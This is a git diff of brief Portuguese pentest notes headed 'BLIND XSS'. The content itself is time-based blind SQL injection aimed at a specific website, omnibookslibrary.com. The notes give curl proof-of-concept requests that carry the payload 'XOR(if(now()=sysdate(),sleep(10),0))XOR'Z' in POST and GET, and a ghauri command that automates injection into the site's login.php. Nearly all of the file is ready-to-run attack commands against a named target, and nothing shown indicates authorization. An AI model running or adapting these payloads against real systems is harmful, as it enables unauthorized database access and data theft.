@@ -1,6 +1,7 @@
 BLIND XSS
 https://www.youtube.com/watch?v=KhVMSTYgMxc&t=264s
 https://www.youtube.com/watch?v=x1z4GxDtEo0 (sqlmapapi)
+https://www.youtube.com/watch?v=Eu1_LbUzdR0
 
 Comando utilizados nos parametros
 [DATA]'--
@@ -11,8 +12,12 @@ Comando utilizados nos parametros
 Comando terminal (POC):
 
    ```bash
+   [POST]
    time curl -X POST -d "[DATA]" https://omnibookslibrary.com/login.php
    time curl -X POST -d "mobile='XOR(if(now()=sysdate(),sleep(10),0))XOR'Z&password=test&login=" https://omnibookslibrary.com/login.php
+
+   [GET]
+   time curl -I "https://omnibookslibrary.com/fccr/busca/'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z"
 
    ghauri -u 'https://omnibookslibrary.com/login.php' --data "mobile=*&password=test&login=" --batch --flush-session
 
